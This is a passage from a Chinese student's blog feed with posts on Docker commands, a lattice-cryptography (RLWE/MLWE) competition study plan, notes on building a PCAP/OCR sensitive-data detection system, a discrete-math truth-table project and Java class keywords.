disabled</span><br></pre></td></tr></table></figure><p><code>disabled</code>表示Docker服务不会随系统启动自动运行。可以使用以下命令设置Docker开机自启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h3 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h3><ul><li><p>拉取镜像</p><p>默认情况下，<code>docker pull</code>会拉取最新版本的镜像。若需拉取特定版本，可指定<code>TAG</code>标签：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.6</span><br></pre></td></tr></table></figure></li><li><p>列出镜像</p><p>使用<code>docker images</code>查看本地已有的镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mysql         5.6       dd3b2a5dcb48   13 months ago   303MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   16 months ago   13.3kB</span><br></pre></td></tr></table></figure></li><li><p>搜索图像搜索</p><p>使用<code>docker search</code>查找公共仓库中的镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME                            DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                           MySQL is a widely used, open-source relation…   13728     [OK]       </span><br><span class="line">mariadb                         MariaDB Server is a high performing open sou…   5238      [OK]       </span><br><span class="line">phpmyadmin                      phpMyAdmin - A web interface for MySQL and M…   726       [OK]       </span><br><span class="line">percona                         Percona Server is a fork of the MySQL relati…   599       [OK]       </span><br><span class="line">databack/mysql-backup           Back up mysql databases to... anywhere!         80                   </span><br><span class="line">bitnami/mysql                   Bitnami MySQL Docker Image                      80                   [OK]</span><br></pre></td></tr></table></figure></li><li><p>删除镜像</p><p>使用<code>docker rmi</code>删除本地镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi hello-world</span><br></pre></td></tr></table></figure></li></ul><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><ul><li><p>创建容器</p><p>使用<code>docker create</code>创建容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker create hello-world</span><br></pre></td></tr></table></figure><p>或指定容器名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker create --name hello-docker hello-world</span><br></pre></td></tr></table></figure></li><li><p>启动容器</p><p>使用<code>docker start</code>启动已创建的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start hello-docker</span><br></pre></td></tr></table></figure></li><li><p>查看容器</p><p>查看所有容器（包括停止的）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure><p>查看正在运行的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></li><li><p>停止容器</p><p>使用<code>docker stop</code>停止运行中的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器名</span><br></pre></td></tr></table></figure></li><li><p>删除容器</p><p>使用<code>docker rm</code>删除容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器名</span><br></pre></td></tr></table></figure></li></ul><h3 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h3><p>使用<code>docker run</code>命令创建并立即启动容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name 容器名 镜像名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name 111 hello-world</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>将Docker容器的端口映射到宿主机的指定端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 宿主机端口:容器端口 -d 镜像名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 2023:80 -d mcc0624/ser:1.8</span><br></pre></td></tr></table></figure><p>此命令将容器内的80端口映射到宿主机的2023端口，访问宿主机的2023端口即可访问Docker容器的服务。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码数学竞赛</title>
      <link href="/posts/dfe83dcf.html"/>
      <url>/posts/dfe83dcf.html</url>
      
        <content type="html"><![CDATA[<p>计算机设计比赛就要弄完了，修改优化代码的日子要告一段落了。接下来准备迎接密码数学挑战赛，虽然我对密码学的学习还比较较有限，但我会尽我所能，尽可能地完成这次比赛。</p><blockquote><p>竞赛官网：<a href="http://www.cmsecc.com/xiazai/?sessionid=1558296889">全国高校密码数学挑战赛</a></p></blockquote><p>我选择的赛题是第二道题，”量子密码”这名字很吸引人，我也很想了解一下量子密码的相关知识。</p><p>让AI帮我梳理了一下题目，我发现题目中涉及到了很多数学的概念，比如环、多项式、同构、范数、汉明重量等。</p><h1 id="RLWE-与-MLWE-密码学问题研究"><a href="#RLWE-与-MLWE-密码学问题研究" class="headerlink" title="RLWE 与 MLWE 密码学问题研究"></a>RLWE 与 MLWE 密码学问题研究</h1><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><h3 id="环与多项式环"><a href="#环与多项式环" class="headerlink" title="环与多项式环"></a>环与多项式环</h3><ul><li>定义了 ( Z<em>m = Z/mZ)，并在其上引入多项式环 ( Z_m[X])。对于多项式 ( f(X))，定义了商环 ( R</em>{m,f} = Z<em>m[X]/(f(X)))，并给出了同构映射 ( \Phi) 将 ( R</em>{m,f}) 中的元素映射为 ( Z_m) 上的向量。</li><li>在 ( Z^n) 和 ( Z<em>{nm}) 上定义了范数，通过 ( \Phi) 扩展到 ( R</em>{m,f}) 上，同时定义了元素的汉明重量 ( wt(a))，用于衡量 ( R_{m,f}) 中元素的大小。</li></ul><h3 id="密码学问题"><a href="#密码学问题" class="headerlink" title="密码学问题"></a>密码学问题</h3><ul><li><strong>RLWE 问题</strong>：给定 ( R_{m,f}) 中的元素 ( a(X))，存在秘密多项式 ( s(X)) 和误差多项式 ( e(X))，使得 ( t(X) = a(X)s(X) + e(X))，( t(X)) 公开而 ( s(X)) 需保密。</li><li><strong>MLWE 问题</strong>：矩阵 ( A(X)) 的元素属于 ( R_{m,f})，存在秘密向量 ( s(X)) 和误差向量 ( e(X))，使得 ( t(X)^T = A(X)s(X)^T + e(X)^T)。</li></ul><h2 id="NIST-相关密码方案"><a href="#NIST-相关密码方案" class="headerlink" title="NIST 相关密码方案"></a>NIST 相关密码方案</h2><ul><li><strong>Kyber</strong>：参数为 ( n = 256)，( q = 3329)，( f(X) = X^{256} + 1)，MLWE 参数 ((k, l)) 有多种组合。</li><li><strong>Dilithium</strong>：参数为 ( q = 8380417)，MLWE 参数 ((k, l)) 也有多种组合。</li></ul><h2 id="实验参数设置"><a href="#实验参数设置" class="headerlink" title="实验参数设置"></a>实验参数设置</h2><ul><li><strong>RLWE 问题实验</strong>：给出了不同的 ( n) 和 ( q) 值下的 RLWE 问题实例，对秘密多项式 ( s(X)) 和误差多项式 ( e(X)) 的取值范围进行了限制。</li><li><strong>MLWE 问题实验</strong>：给出了 ( n = 256)，( q = 3329)，( f(X) = X^{256} + 1)，((k, l) = (2, 2)) 时的 MLWE 问题实例，对秘密向量 ( s(X)) 的取值范围进行了限制。</li></ul><h2 id="研究方案"><a href="#研究方案" class="headerlink" title="研究方案"></a>研究方案</h2><h3 id="研究目标"><a href="#研究目标" class="headerlink" title="研究目标"></a>研究目标</h3><ul><li>深入理解 RLWE 和 MLWE 问题的数学原理和密码学应用。</li><li>分析不同参数设置下 RLWE 和 MLWE 问题的安全性和效率。</li><li>探索 RLWE 和 MLWE 问题在实际密码系统中的应用潜力。</li></ul><h3 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h3><h4 id="理论分析"><a href="#理论分析" class="headerlink" title="理论分析"></a>理论分析</h4><ul><li><strong>数学基础研究</strong>：研究环论、多项式环、同构映射。</li><li><strong>密码学原理分析</strong>：分析 RLWE 和 MLWE 问题的定义、安全性证明和密码学应用。</li></ul><h4 id="实验研究"><a href="#实验研究" class="headerlink" title="实验研究"></a>实验研究</h4><ul><li><strong>参数敏感性分析</strong>：改变 (n)、(q)、(f(X)) 等参数，研究其对 RLWE 和 MLWE 问题安全性和效率的影响。</li><li><strong>安全性评估</strong>：使用密码分析工具，评估不同参数设置下的 RLWE 和 MLWE 问题的安全性。</li><li><strong>效率测试</strong>：实现 RLWE 和 MLWE 问题的算法，测试时间复杂度和空间复杂度。</li></ul><h3 id="研究步骤"><a href="#研究步骤" class="headerlink" title="研究步骤"></a>研究步骤</h3><h4 id="第一阶段：理论学习（第-1-2-周）"><a href="#第一阶段：理论学习（第-1-2-周）" class="headerlink" title="第一阶段：理论学习（第 1 - 2 周）"></a>第一阶段：理论学习（第 1 - 2 周）</h4><ul><li>学习环论、多项式环、同构映射等数学知识。</li><li>研究 RLWE 和 MLWE 问题的定义、安全性证明和密码学应用。</li></ul><h4 id="第二阶段：实验准备（第-3-4-周）"><a href="#第二阶段：实验准备（第-3-4-周）" class="headerlink" title="第二阶段：实验准备（第 3 - 4 周）"></a>第二阶段：实验准备（第 3 - 4 周）</h4><ul><li>实现 RLWE 和 MLWE 问题的加密、解密和签名算法。</li><li>搭建实验环境，准备实验数据。</li></ul><h4 id="第三阶段：实验研究（第-5-8-周）"><a href="#第三阶段：实验研究（第-5-8-周）" class="headerlink" title="第三阶段：实验研究（第 5 - 8 周）"></a>第三阶段：实验研究（第 5 - 8 周）</h4><ul><li>进行参数敏感性分析，记录实验结果。</li><li>对不同参数设置下的 RLWE 和 MLWE 问题进行安全性评估和效率测试。</li></ul><h4 id="第四阶段：结果分析与总结（第-9-10-周）"><a href="#第四阶段：结果分析与总结（第-9-10-周）" class="headerlink" title="第四阶段：结果分析与总结（第 9 - 10 周）"></a>第四阶段：结果分析与总结（第 9 - 10 周）</h4><ul><li>分析实验结果，总结不同参数设置下 RLWE 和 MLWE 问题的安全性和效率特点。</li><li>撰写研究报告，提出研究结论和建议。</li></ul><h3 id="预期成果"><a href="#预期成果" class="headerlink" title="预期成果"></a>预期成果</h3><ul><li>深入理解 RLWE 和 MLWE 问题的数学原理和密码学应用。</li><li>分析不同参数设置下 RLWE 和 MLWE 问题的安全性和效率，为实际密码系统的设计提供参考。</li><li>撰写研究报告，总结研究成果和发现。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统开发篇</title>
      <link href="/posts/dbb136fa.html"/>
      <url>/posts/dbb136fa.html</url>
      
        <content type="html"><![CDATA[<p>很长一段时间没有更新blog了，最近在忙计算机设计大赛的参赛作品设计，所以没有更新blog。今天我要分享一下我最近的一些工作。</p><blockquote><p>比赛官网：<a href="https://sist.gdufs.edu.cn/info/1703/10482.htm">2025年广东省大学生计算机设计大赛</a></p></blockquote><h2 id="敏感数据识别系统开发手记"><a href="#敏感数据识别系统开发手记" class="headerlink" title="敏感数据识别系统开发手记"></a>敏感数据识别系统开发手记</h2><h3 id="系统架构全景"><a href="#系统架构全景" class="headerlink" title="系统架构全景"></a>系统架构全景</h3><p>基于网络流量分析与 OCR 识别技术，构建了支持 PB 级数据处理的分布式系统：</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TD    A[PCAP文件解析] --&gt; B[流量特征提取]    B --&gt; C[敏感数据识别]    C --&gt; D[OCR图像处理]    D --&gt; E[结构化存储]  </pre></div><p><strong>各模块简介</strong>：</p><ul><li><strong>PCAP 文件解析</strong>：读取网络流量文件，提取原始数据。</li><li><strong>流量特征提取</strong>：分析数据包特征，定位潜在敏感信息。</li><li><strong>敏感数据识别</strong>：运用算法精准识别敏感数据。</li><li><strong>OCR 图像处理</strong>：将图像文字转为可编辑文本。</li><li><strong>结构化存储</strong>：整理并存储识别结果。</li></ul><h3 id="核心技术解析"><a href="#核心技术解析" class="headerlink" title="核心技术解析"></a>核心技术解析</h3><ol><li><strong>分片式流量分析</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基于 editcap 的分片处理逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_pcap</span>(<span class="params">file_path, chunk_size=<span class="number">500000</span></span>):</span><br><span class="line">    cmd = <span class="string">f&#x27;editcap -c <span class="subst">&#123;chunk_size&#125;</span> &quot;<span class="subst">&#123;file_path&#125;</span>&quot; temp/split.pcap&#x27;</span></span><br><span class="line">    subprocess.run(cmd, shell=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>采用自适应分片策略（1GB 阈值），支持断点续处理机制。</p><p>并行处理效率对比：</p><div class="table-container"><table><thead><tr><th>文件大小</th><th>串行处理</th><th>并行处理 (8 核)</th></tr></thead><tbody><tr><td>500MB</td><td>182s</td><td>47s</td></tr><tr><td>2.5GB</td><td>912s</td><td>198s</td></tr></tbody></table></div><ol><li><strong>OCR 深度集成</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多进程 OCR 处理框架</span></span><br><span class="line"><span class="keyword">with</span> ProcessPoolExecutor(max_workers=<span class="number">8</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    results = <span class="built_in">list</span>(tqdm(executor.<span class="built_in">map</span>(ocr_process, img_list)))</span><br></pre></td></tr></table></figure><p>遭遇 BrokenProcessPool 异常时有自动恢复机制，还有图片预处理流水线。</p><h3 id="开发挑战实录"><a href="#开发挑战实录" class="headerlink" title="开发挑战实录"></a>开发挑战实录</h3><ul><li><strong>内存泄漏追凶记</strong> ：日志出现异常堆栈：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concurrent.futures.process.BrokenProcessPool: </span><br><span class="line">A process in the process pool was terminated abruptly...</span><br></pre></td></tr></table></figure><p>通过增加进程心跳监测、引入资源限额机制、优化图像缓存策略解决。</p><ul><li><strong>多线程优化</strong> ：优化线程调度与任务分配，减少线程竞争与同步开销，提升性能。</li></ul><h3 id="系统运行效果"><a href="#系统运行效果" class="headerlink" title="系统运行效果"></a>系统运行效果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-04-21 08:41:10 - 启动数据处理流程 | 方法: 并行分片分析</span><br><span class="line">2025-04-21 08:44:09 - 处理完成 | CSV 记录数: 8041 | 解析图片: 15936</span><br></pre></td></tr></table></figure><h3 id="未来演进方向"><a href="#未来演进方向" class="headerlink" title="未来演进方向"></a>未来演进方向</h3><ul><li>基于深度学习的流量特征预测</li><li>自适应分片算法优化</li><li>异构计算资源调度</li></ul><h3 id="开发感悟"><a href="#开发感悟" class="headerlink" title="开发感悟"></a>开发感悟</h3><p>在分布式系统的世界里，异常处理不是可选技能而是生存法则。每个崩溃的进程都在讲述资源竞争的故事，每条日志都是系统与开发者对话的痕迹。</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散作业</title>
      <link href="/posts/70304a71.html"/>
      <url>/posts/70304a71.html</url>
      
        <content type="html"><![CDATA[<p>这几天的学习主要是完成离散作业，学习了逻辑运算的概念和操作，并用Python实现了逻辑运算的真值表，以及逻辑运算的基本运算规则。</p><blockquote><p>项目地址：<a href="https://github.com/Aurorp1g/Discrete_Mathematics">Discrete_Mathematics</a></p></blockquote><h1 id="命题逻辑分析系统"><a href="#命题逻辑分析系统" class="headerlink" title="命题逻辑分析系统"></a>命题逻辑分析系统</h1><!-- Author: Aurorp1g --><!-- github: https://github.com/Aurorp1g/Discrete_Mathematics --><!-- Date: 2025-03-29 --><!-- LastEditTime: 2025-04-01 --><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ol><li>求任意一个命题公式的真值表。</li><li>求任意一个命题公式的主范式。</li><li>判断两个命题公式是否等值。</li></ol><h2 id="设计灵感"><a href="#设计灵感" class="headerlink" title="设计灵感"></a>设计灵感</h2><ol><li>遵循简单的设计原则，使用Python语言编写。</li><li>以git的bash程序和gui程序为灵感，设计了两个模式，面向用户，方便用户选择</li></ol><blockquote><p>效果如下：</p></blockquote><p>bash模式：</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/70304a71_1.png" alt="bash模式"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/70304a71_3.png" alt="bash模式界面"></p><p>gui模式：</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/70304a71_2.png" alt="gui模式"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/70304a71_4.png" alt="gui模式界面"></p><h2 id="程序源码介绍"><a href="#程序源码介绍" class="headerlink" title="程序源码介绍"></a>程序源码介绍</h2><ol><li>main.py：程序的入口，用于接收用户对系统模式的选择，进一步调用其他模块。</li><li>bash.py: 系统的bash模式，运行于命令行窗口，用于接收用户输入的命题公式，调用其他模块进行分析。</li><li>gui.py: 系统的gui模式，运行于图形化界面，用于接收用户输入的命题公式，调用其他模块进行分析。</li><li>calculate.py: 系统的运算核心模块，用于计算命题公式的真值表，同时推测出公式的主范式。</li></ol><h2 id="使用介绍："><a href="#使用介绍：" class="headerlink" title="使用介绍："></a>使用介绍：</h2><ol><li>运行main.py，选择模式。</li><li>选择bash模式，在命令行窗口中输入命题公式，系统将自动计算真值表和主范式。</li><li>选择gui模式，在图形化界面中输入命题公式，系统将自动计算真值表和主范式。</li><li>输入两个命题公式，系统将自动判断两个命题公式是否等值。</li></ol><blockquote><p>OR<br>直接运行bash.py或gui.py，main.py仅仅便于bash模式或gui模式的选择与切换。<br>bash模式与gui模式的功能相同，只是输入方式不同。且两个模块与main.py相互独立，可单独运行。</p></blockquote><h2 id="标注"><a href="#标注" class="headerlink" title="标注"></a>标注</h2><blockquote><p>本系统的核心模块为calculate.py，用于计算命题公式的真值表。附加功能：推测出公式的主范式。<br>本系统的bash.py和gui.py模块用于接收用户输入的命题公式，调用其他模块进行分析。<br>本系统的main.py模块用于接收用户对系统模式的选择，进一步调用其他模块。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类和对象</title>
      <link href="/posts/a5ada01d.html"/>
      <url>/posts/a5ada01d.html</url>
      
        <content type="html"><![CDATA[<p>在 Java 中，类、对象和变量是面向对象编程的核心概念，而关键字是 Java 语言中具有特殊含义的保留字，用于执行特定的操作或表达特定的语义。以下是与类、对象和变量相关的 Java 关键字的总结，包括类的访问权限相关的关键词：</p><h3 id="类相关的关键词"><a href="#类相关的关键词" class="headerlink" title="类相关的关键词"></a>类相关的关键词</h3><ol><li><p><strong><code>class</code></strong></p><ul><li>用于定义一个类，类是 Java 中面向对象编程的基本构建块，它封装了数据和操作数据的方法。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>extends</code></strong></p><ul><li>用于指定一个类继承另一个类，继承允许子类继承父类的属性和方法。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">SuperClass</span> &#123;</span><br><span class="line">    <span class="comment">// 子类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>implements</code></strong></p><ul><li>用于指定一个类实现一个或多个接口，接口定义了一组方法，实现接口的类必须提供这些方法的具体实现。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> <span class="keyword">implements</span> <span class="title class_">MyInterface</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>final</code></strong></p><ul><li>当用于类时，表示该类不能被继承。即不能有子类。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FinalClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>abstract</code></strong></p><ul><li>用于定义抽象类，抽象类不能被实例化，只能被继承。抽象类可以包含抽象方法（没有实现的方法）。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractClass</span> &#123;</span><br><span class="line">    <span class="comment">// 抽象类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>interface</code></strong></p><ul><li>用于定义接口，接口是一种特殊的类，它包含抽象方法和常量。类可以通过 <code>implements</code> 关键字实现接口。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">myMethod</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="对象相关的关键词"><a href="#对象相关的关键词" class="headerlink" title="对象相关的关键词"></a>对象相关的关键词</h3><ol><li><p><strong><code>new</code></strong></p><ul><li>用于创建一个类的新实例，即创建对象。使用 <code>new</code> 关键字调用类的构造方法来初始化对象。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>this</code></strong></p><ul><li>用于引用当前对象本身。可以在类的方法中使用 <code>this</code> 来访问当前对象的属性和方法。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x; <span class="comment">// 使用 this 引用当前对象的属性</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.x); <span class="comment">// 使用 this 引用当前对象的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>super</code></strong></p><ul><li>用于引用当前对象的父类对象。可以在子类的方法中使用 <code>super</code> 来访问父类的属性和方法，或者调用父类的构造方法。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">SuperClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SubClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(); <span class="comment">// 调用父类的构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.myParentMethod(); <span class="comment">// 调用父类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>instanceof</code></strong></p><ul><li>用于判断一个对象是否是某个类的实例。它返回一个布尔值，表示对象是否属于指定的类或其子类。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> MyClass) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;obj 是 MyClass 的实例&quot;</span>);</span><br><span 